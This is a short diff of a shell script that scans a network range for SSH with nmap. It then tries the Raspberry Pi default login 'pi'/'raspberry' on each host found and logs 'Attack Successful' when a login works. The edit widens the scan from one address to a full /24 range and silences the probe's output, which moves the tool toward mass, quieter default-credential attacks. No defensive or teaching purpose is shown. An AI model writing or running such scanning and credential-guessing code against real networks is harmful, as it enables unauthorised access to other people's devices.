@@ -14,7 +14,7 @@ main() {
 }
 
 function scan() {
-	command="nmap -p 22 -oG - -sV 10.1.63.233 | grep -op 'Host:.*ssh.*'
+	command="nmap -p 22 -oG - -sV 10.1.63.0-255 | grep -op 'Host:.*ssh.*'
 		| awk '{print \$2}'"
 
 	# Remember to add `--open` to the above command to filter
@@ -31,9 +31,9 @@ function scan() {
 
 function probe() {
 	log "Probing $1"
-	./probe.sh pi $1 raspberry # > /dev/null 2>&1
+	./probe.sh pi $1 raspberry > /dev/null 2>&1
 	case "$?" in 
-		0) log "> Attack Successfull";;
+		0) log "> Attack Successful";;
 		1) log "> Network timeout";;
 		2) log "> Could not determine password";;
 		*) alert "Unknown error occured while probing.  Code: $?";;
